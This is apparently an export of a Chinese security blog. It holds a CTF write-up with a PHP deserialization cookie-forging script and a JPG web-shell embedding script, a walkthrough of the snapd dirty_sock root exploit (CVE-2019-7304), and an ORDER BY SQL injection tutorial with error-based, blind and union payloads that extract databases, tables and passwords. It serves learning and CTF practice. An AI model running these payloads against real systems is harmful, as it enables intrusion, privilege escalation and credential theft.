&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!&lt;span class=&quot;keyword&quot;&gt;empty&lt;/span&gt;($_POST[&lt;span class=&quot;string&quot;&gt;&amp;quot;nickname&amp;quot;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $arr = &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;($_POST[&lt;span class=&quot;string&quot;&gt;&amp;quot;nickname&amp;quot;&lt;/span&gt;],&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;eancrykey);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $data = &lt;span class=&quot;string&quot;&gt;&amp;quot;Welcome my friend %s&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt; ($arr &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $k =&amp;gt; $v) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $data = sprintf($data,$v);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;built_in&quot;&gt;parent&lt;/span&gt;::response($data,&lt;span class=&quot;string&quot;&gt;&amp;quot;Welcome&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt; 可以看到此处有输出数组，但是关键此处输出只能输出nickname的值，因为nickname的值把%s占位符替代之后，循环到$this-&gt;eancrykey时候，就无法输出$this-&gt;eancrykey，例如假如post的数据为nickname=zzqsmile,$data就变成了”Welcome my friend zzqsmile”,此时我们要仔细想一想如和才能绕过第一个POST的数据，来输出$this-&gt;eancrykey，仔细想下可能会想到吧，就是直接传入%s作为nickname变量的值，这样就能够将遍历到$this-&gt;eancrykey的值拼接到$data并通过父类response()函数输出。拿到$this-&gt;eancrykey的值就可以随便构造Cookie。 分析到这人已经蒙了，怎么才能输出flag呢？这时候又要回去看Application.php文件中类的析构函数了，析构函数中可以读取$path的文件内容，因此，仅仅需要用心构造好一个cookie，将文件路径写进$path，等到触发析构函数的时候让其输出flag文件内容，此时又需要一个脑洞，通过提示知道文件路径是18位，flag文件和key在一个文件夹下，因此猜想路径为../config/flag.txt,正好18位。但是之前对../进行过滤了，所以在构造序列化对象时候要构造成..././config/flag.txt，分析完之后就开干。 访问app/Session.php文件。 可以看到开始没有cookie时会设置cookie。 可以看到图中标记红色部分1a303cbea7ecff312df1cbd194e1def0即是$cookiedata.md5($this-&gt;eancrykey.$cookiedata);的结果。这个cookie是通过是一个合法的cookie，那么如果我们将这段合法的cookie带进头部，程序是不是就会读取这段cookie了，这样程序就会执行到session_read()里面，如下： 没毛病，按照之前分析，下一步得到$this-&gt;eancrykey的值EzblrbNS，不过此处要注意的是Content-Type:字段值是否为：application/x-www-form-urlencoded，关键点都已在下图标出。 得到$this-&gt;eancrykey值接下来就写个很low的脚本构造下cookie。 123456789101112131415161718192021&lt;?phpClass Application &#123; var $path &#x3D; &#39;...&#x2F;.&#x2F;config&#x2F;flag.txt&#39;;&#125;&#x2F;&#x2F;$this-&gt;eancrykey$zzz &#x3D; new Application();$b &#x3D; serialize($zzz); echo &quot;$b&quot;;echo &quot;&lt;br&gt;&quot;;&#x2F;&#x2F;$b&#x2F;&#x2F; O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;...&#x2F;.&#x2F;config&#x2F;flag.txt&quot;;&#125;$a &#x3D; $b.md5(&#39;EzblrbNS&#39;.$b);echo $a; &#x2F;&#x2F;$a&#x2F;&#x2F; O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;...&#x2F;.&#x2F;config&#x2F;flag.txt&quot;;&#125;5a014dbe49334e6dbb7326046950bee2 &#x2F;&#x2F;echo &quot;&lt;br&gt;&quot;;echo urlencode($a);&#x2F;&#x2F;urlencode($a)&#x2F;&#x2F; O%3A11%3A%22Application%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A21%3A%22...%2F.%2Fconfig%2Fflag.txt%22%3B%7D5a014dbe49334e6dbb7326046950bee2?&gt; 最后成功拿到flag。 Upload-IMG 题目地址 [http://117.51.148.166/upload.php）(http://117.51.148.166/upload.php) 解题过程 1). 按照给的认证用户名，密码进入题目 通过测试发现，主要是只能上传图片，题目是通过文件内容中有phpinfo()字符串来决定是否通关的，测试发现，上传的图片是被经过二次渲染的，因此，就要绕过二次渲染，使其phpinfo()内容不发生改变。 2). 直接用据说国外牛人写的脚本制作图片马。 脚本jpg_payload.php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 使用方法 1). 随便找一个jpg图片,先上传至服务器然后再下载到本地保存为1.jpg2). 使用脚本处理1.jpg,命令php jpg_payload.php 1.jpg 亲测有效，不愧是大佬，稳了一P。 参考 https://xz.aliyun.com/t/2657 &lt;完&gt;太菜了，只能玩到这了，写的不好别喷，坐等其他Writeup","categories":[{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/tags/CTF/"}]},{"title":"sqlmap使用指南","slug":"工具使用/sqlmap","date":"2019-04-06T01:00:00.000Z","updated":"2019-04-06T13:27:38.000Z","comments":true,"path":"2019/04/06/工具使用/sqlmap/","link":"","permalink":"http://zzqsmile.top/2019/04/06/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/","excerpt":"本文旨在记录sqlmap使用方法","text":"本文旨在记录sqlmap使用方法 sqlmap脑图 https://github.com/bugku/Mind-Map/blob/master/SQLmap%E8%84%91%E5%9B%BE.jpg","categories":[{"name":"tools","slug":"tools","permalink":"http://zzqsmile.top/categories/tools/"}],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"http://zzqsmile.top/tags/sqlmap/"}]},{"title":"跨域资源共享CORS","slug":"传送门/CORS","date":"2019-04-04T01:00:00.000Z","updated":"2019-04-04T07:33:22.000Z","comments":true,"path":"2019/04/04/传送门/CORS/","link":"","permalink":"http://zzqsmile.top/2019/04/04/%E4%BC%A0%E9%80%81%E9%97%A8/CORS/","excerpt":"本片文章为传送门，其内容是对跨域资源共享CORS的详解,写的特别详细","text":"本片文章为传送门，其内容是对跨域资源共享CORS的详解,写的特别详细 http://www.ruanyifeng.com/blog/2016/04/cors.html","categories":[{"name":"web安全","slug":"web安全","permalink":"http://zzqsmile.top/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"传送门","slug":"传送门","permalink":"http://zzqsmile.top/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"}]},{"title":"CTF必备技能之编码大全","slug":"传送门/编码","date":"2019-03-29T01:00:00.000Z","updated":"2019-03-29T14:11:56.000Z","comments":true,"path":"2019/03/29/传送门/编码/","link":"","permalink":"http://zzqsmile.top/2019/03/29/%E4%BC%A0%E9%80%81%E9%97%A8/%E7%BC%96%E7%A0%81/","excerpt":"本片文章为传送门，其内容是关于编码的知识讲解","text":"本片文章为传送门，其内容是关于编码的知识讲解 https://mp.weixin.qq.com/s/a28yG1bBg-dyyZNG0R8qKw","categories":[{"name":"编码","slug":"编码","permalink":"http://zzqsmile.top/categories/%E7%BC%96%E7%A0%81/"}],"tags":[{"name":"传送门","slug":"传送门","permalink":"http://zzqsmile.top/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"}]},{"title":"MySQL数据库安全测试","slug":"Database/MySQL数据库安全测试","date":"2019-03-27T01:00:00.000Z","updated":"2019-03-27T07:52:10.000Z","comments":true,"path":"2019/03/27/Database/MySQL数据库安全测试/","link":"","permalink":"http://zzqsmile.top/2019/03/27/Database/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/","excerpt":"一发传送门，主要讲了MySQL数据库的相关安全测试，和MySQL提权","text":"一发传送门，主要讲了MySQL数据库的相关安全测试，和MySQL提权 传送门：http://www.mchz.com.cn/cn/service/Safety-Lab/info_26_itemid_2015.html","categories":[{"name":"Database","slug":"Database","permalink":"http://zzqsmile.top/categories/Database/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://zzqsmile.top/tags/mysql/"}]},{"title":"ubuntu本地提权漏洞复现(CVE-2019-7304)","slug":"权限提升/ubuntu本地提权漏洞复现(CVE-2019-7304)","date":"2019-02-19T01:00:00.000Z","updated":"2019-02-20T02:54:18.000Z","comments":true,"path":"2019/02/19/权限提升/ubuntu本地提权漏洞复现(CVE-2019-7304)/","link":"","permalink":"http://zzqsmile.top/2019/02/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2019-7304)/","excerpt":"简介1Ubuntu Linux的默认安装&#96;snapd&#96;服务，由于snapd API中的一个错误，任何本地用户都可以利用此漏洞获取对系统的直接root访问权限。","text":"简介1Ubuntu Linux的默认安装&#96;snapd&#96;服务，由于snapd API中的一个错误，任何本地用户都可以利用此漏洞获取对系统的直接root访问权限。 受影响版本12.37.1以下 测试环境123456789101112131415zzq@zzq-virtual-machine:~$ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 16.04.5 LTSRelease: 16.04Codename: xenialzzq@zzq-virtual-machine:~$ snap versionsnap 2.34.2snapd 2.34.2series 16ubuntu 16.04kernel 4.15.0-29-genericzzq@zzq-virtual-machine:~$ python2 漏洞复现 下载提权使用的exp1zzq@zzq-virtual-machine:~$ git clone https:&#x2F;&#x2F;github.com&#x2F;initstring&#x2F;dirty_sock.git 进入下载的目录，里面是两个py文件，分别是不同的利用脚本 方式 1：使用dirty_sockv1.py 前提条件 1231.所在的环境需要能够访问到外部网络。2.需要ubuntu sso的账号，自行到官网注册，地址：https:&#x2F;&#x2F;login.ubuntu.com&#x2F; 3.所在的环境需要安装ssh服务 下面是我自己注册的账户 接下来首先在本地生成公钥1$ ssh-keygen -t rsa -C &quot;&lt;you email&gt;&quot; 将生成的公钥导入到ubuntu账号SSH keys中 最后在本地执行dirty_sockv1.py，执行之前一定要先安装ssh服务 1$ python dirty_sockv1.py -u &quot;&lt;your email&gt;&quot; -k &quot;私钥&quot; 成功执行完毕，再执行sudo -i，就成功提权到root 方式 2：使用dirty_sockv2.py 第2中方法操作简单：无需任何条件，直接执行dirty_sockv2.py即可，执行成功后会创建一个dirty_sock用户，密码也为dirty_sock ，如下： 接下来先切换到用户dirty_sock，密码dirty_sock，然后再通过sudo -i提升到root权限 在执行su dirty_sock的时候可能会遇到以下情况，No passwd entry for user &#39;dirty_sock&#39;不幸的我是遇到了 如果遇到此情况按下图操作，查看任务进度，等到doing任务执行完之后再进行尝试，如果仍不行，请使用方法一。 参考http://lawlietweb.com/2019/02/17/ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0%EF%BC%88CVE-2019-7304%EF%BC%89/ https://www.anquanke.com/post/id/170942","categories":[{"name":"权限提升","slug":"权限提升","permalink":"http://zzqsmile.top/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}],"tags":[{"name":"提权","slug":"提权","permalink":"http://zzqsmile.top/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"Order by排序注入方法小总结","slug":"web安全/Order_by排序注入方法小总结","date":"2018-11-12T01:00:00.000Z","updated":"2019-04-04T07:13:50.000Z","comments":true,"path":"2018/11/12/web安全/Order_by排序注入方法小总结/","link":"","permalink":"http://zzqsmile.top/2018/11/12/web%E5%AE%89%E5%85%A8/Order_by%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/","excerpt":"今天总结一下注入点在order by排序注入，学习一下记录下这个过程声明：此文谨供学习记录研究使用，切勿用于非法用途，否则后果自负！","text":"今天总结一下注入点在order by排序注入，学习一下记录下这个过程声明：此文谨供学习记录研究使用，切勿用于非法用途，否则后果自负！ 注入方法介绍 正常语句 12345678910111213141516171819202122232425262728293031323334353637383940414243mysql&gt; select * from users order by id;+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; select * from users order by id desc;+----+----------+------------+| id | username | password |+----+----------+------------+| 14 | admin4 | admin4 || 12 | dhakkan | dumbo || 11 | admin3 | admin3 || 10 | admin2 | admin2 || 9 | admin1 | admin1 || 8 | admin | admin || 7 | batman | mob!le || 6 | superman | genious || 5 | stupid | stupidity || 4 | secure | crappy || 3 | Dummy | p@ssword || 2 | Angelina | I-kill-you || 1 | Dumb | Dumb |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; 其中select * from users order by id desc;的desc是可控的传参值。 order by 与报错注入 当页面出现mysql报错信息时，注入点在 order by后面，此时可以利用报错信息进行注入。 下面进行报错注入 首先获取基本一些基本信息总结 12345678910111213141516171819mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select database())),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39; &#x2F;&#x2F;获取当前数据库mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select version())),0)); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53&#39; &#x2F;&#x2F;获取数据库版本mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select user())),0)); ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39; &#x2F;&#x2F;获取用户mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select @@datadir)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~E:\\soft\\phpmystudy\\MySQL\\data\\&#39; &#x2F;&#x2F;获取数据库路径mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select @@version_compile_os)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~Win32&#39; &#x2F;&#x2F;获取操作系统mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select @@basedir)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~E:&#x2F;soft&#x2F;phpmystudy&#x2F;MySQL&#x2F;&#39; &#x2F;&#x2F;mysql安装路径mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select session_user())),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39; &#x2F;&#x2F;获取连接数据库的用户名mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select current_user())),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39; &#x2F;&#x2F;获取当前用户名mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select system_user())),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39; &#x2F;&#x2F;获取系统用户名mysql&gt; 获取数据信息 获取数据库个数 1234567mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select count(*) from information_schema.schemata)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~11&#39;mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select count(schema_name) from information_schema.schemata)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~11&#39;mysql&gt;注：count(*)是对结果函数统计，而count(schema_name)则是对不为空的行数结果进行统计 获取数据库列表信息 12345678mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~information_schema&#39;mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~challenges&#39;mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~dvwa&#39;mysql&gt; 注： 这里使用limit逐条获取，为什么这样呢？因为我发现使用group_concat()批量查询输出结果长度有限制，因此需要这样一条一条获取了，当然数据多的时候就要简单写个python脚本跑了 获取某数据库表信息 获取表个数 payload: 1and(updatexml(1,concat(0x7e,(select count(*) from information_schema.tables where table_schema &#x3D; &quot;数据库名&quot;)),0)) 12345mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select count(*) from information_schema.tables where table_schema &#x3D; &quot;security&quot;)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~4&#39;mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema &#x3D; &quot;security&quot;)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~4&#39;mysql&gt; 获取表名 payload: 1and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &quot;数据库名&quot;)),0)) 123456789mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &quot;security&quot;)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~emails,referers,uagents,users&#39;mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &quot;security&quot; limit 0,1)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~emails&#39;mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &quot;security&quot; limit 1,1)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~referers&#39;mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &quot;security&quot; limit 2,1)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~uagents&#39;mysql&gt; 获取某数据库中某个表字段信息 字段个数 payload: 1and (updatexml(1,concat(0x7e,(select count(*) from information_schema.columns where table_schema &#x3D; &quot;数据库名&quot; and table_name &#x3D; &quot;表名&quot;)),0)) 12345mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select count(*) from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot;)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~3&#39;mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select count(column_name) from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot;)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~3&#39;mysql&gt; 获取字段名，字段多的需要单条获取 payload: 1and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &quot;数据库名&quot; and table_name &#x3D; &quot;表名&quot;)),0)) 123456789mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot;)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~id,username,password&#39;mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot; limit 0,1)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~id&#39;mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot; limit 1,1)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~username&#39;mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot; limit 2,1)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~password&#39;mysql&gt; 最后获取想要的信息就简单了 1234567mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select username,password from users limit 0,1)),0));ERROR 1241 (21000): Operand should contain 1 column(s)mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select username from users limit 0,1)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~Dumb&#39;mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select password from users limit 0,1)),0));ERROR 1105 (HY000): XPATH syntax error: &#39;~Dumb&#39;mysql&gt; 经测试，貌似只能指定获取一个字段信息 order by 与盲注 当页面没有展示MYSQL的错误信息时，且只能根据页面回显的状态进行判断时，可以使用布尔盲注 简单看两条语句 1234567891011121314151617181920212223242526272829303132333435363738394041mysql&gt; select * from users order by id ^(select(select version()) regexp &#39;^aaaa&#39;);+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; select * from users order by id ^(select(select version()) regexp &#39;^5&#39;);+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 3 | Dummy | p@ssword || 2 | Angelina | I-kill-you || 5 | stupid | stupidity || 4 | secure | crappy || 7 | batman | mob!le || 6 | superman | genious || 9 | admin1 | admin1 || 8 | admin | admin || 11 | admin3 | admin3 || 10 | admin2 | admin2 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; 简单解释一下就是在regexp 正则匹配的时候，如果匹配到数据返回1(00000001)的时候，此时的1会和id中的数据的二进制进行异或，按照异或的结果进行升序排列，所以显示的排列会发生变化；反之当进行正则匹配的时候，未匹配到数据返回0(00000000)，此时数字和0异或的结果还是本身，所以显示的排列不会发生改变。 总结：当页面排序紊乱时则说明正则匹配到正确数据，页面排序未发生紊乱时则说明正则没有匹配到数据 通过以上可以判断数据库版本在5以上，这里的&#39;^5&#39;也可以转换成^5的十六进制。 order by 与 union 联合查询 当 $query = &quot;select * from users order by id $input &quot;; 没有使用括号包裹的时候，是无法直接使用union查询的。 当 $query = &quot;(select * from users order by id $input) &quot;;使用括号进行包裹的时候，此时是可以进行union查询的。 获取版本号 12345678910111213141516171819202122mysql&gt; (select * from users order by id ) union(select 1,(version()),3);+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 || 1 | 5.5.53 | 3 |+----+----------+------------+14 rows in set (0.00 sec)mysql&gt; 其他就不一一截图了,查询语句格式如下： 1(select * from users order by id ) union(select 1,(payload),3); 数据库信息payload: 123456789database() &#x2F;&#x2F;获取当前数据库version() &#x2F;&#x2F;获取数据库版本user() &#x2F;&#x2F;获取用户@@datadir &#x2F;&#x2F;获取数据库路径@@version_compile_os &#x2F;&#x2F;获取操作系统@@basedir &#x2F;&#x2F;mysql安装路径session_user() &#x2F;&#x2F;获取连接数据库的用户名current_user() &#x2F;&#x2F;获取当前用户名system_user() &#x2F;&#x2F;获取系统用户名 表信息payload: 